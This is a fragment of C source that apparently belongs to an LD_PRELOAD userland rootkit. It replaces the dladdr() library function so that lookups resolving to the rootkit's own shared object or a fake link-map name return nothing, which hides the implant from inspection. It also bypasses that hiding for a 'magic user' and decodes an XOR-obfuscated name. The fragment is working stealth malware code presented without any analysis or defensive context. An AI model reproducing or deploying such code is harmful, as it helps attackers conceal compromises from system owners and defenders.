int dladdr(const void *addr, Dl_info *info){
    int noshow = 0, rv;
    Dl_info bdvl_info;
    char *fake;

    hook(CDLADDR);
    if(magicusr())
        return (long)call(CDLADDR, addr, info);

    if(!initmvbc())
        return 0;

    memset(&bdvl_info, 0, sizeof(Dl_info));
    rv = (long)call(CDLADDR, addr, &bdvl_info);
    fake = xordup(FAKE_LINKMAP_NAME);
    rv != 0 && (strstr(bdvl_info.dli_fname, mvbc->bdvlso) || strstr(bdvl_info.dli_fname, fake)) ? noshow = 1 : 0;
    clean(fake);

    if(noshow) return 0;
    return (long)call(CDLADDR, addr, info);
}
